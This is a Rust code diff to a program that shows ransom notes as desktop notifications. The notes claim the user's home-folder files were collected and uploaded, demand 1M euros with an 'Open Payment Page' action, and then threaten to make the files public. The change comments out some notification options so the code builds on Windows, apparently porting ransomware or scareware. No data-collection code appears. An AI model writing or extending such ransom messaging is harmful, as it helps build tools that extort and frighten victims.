@@ -1,5 +1,5 @@
 use home;
-use notify_rust::{Hint, Notification, Urgency};
+use notify_rust::Notification;
 use std::fs::read_dir;
 use std::path::PathBuf;
 
@@ -29,8 +29,8 @@ fn show_notification(count: u32) {
         .summary(&format!("{} files seized", count))
         .body(&format!("{} files in your home folder have been collected and uploaded to our server, pay 1M euros to recover", count))
         .icon("error")
-        .urgency(Urgency::Critical)
-        .hint(Hint::Resident(true))
+        // ! .urgency(Urgency::Critical) Not working when compiling to Windows
+        // ! .hint(Hint::Resident(true)) Same as above
         .timeout(0)
         .action("show_notification", "Open Payment Page")
         .show()
@@ -48,7 +48,7 @@ fn show_notification(count: u32) {
         .summary("Shouldn't have done that")
         .body("Sadly, all your files are now being made public")
         .icon("error")
-        .urgency(Urgency::Critical)
+        // ! .urgency(Urgency::Critical) Look above
         //.action("98765", "Try Again")
         .show()
         .unwrap();
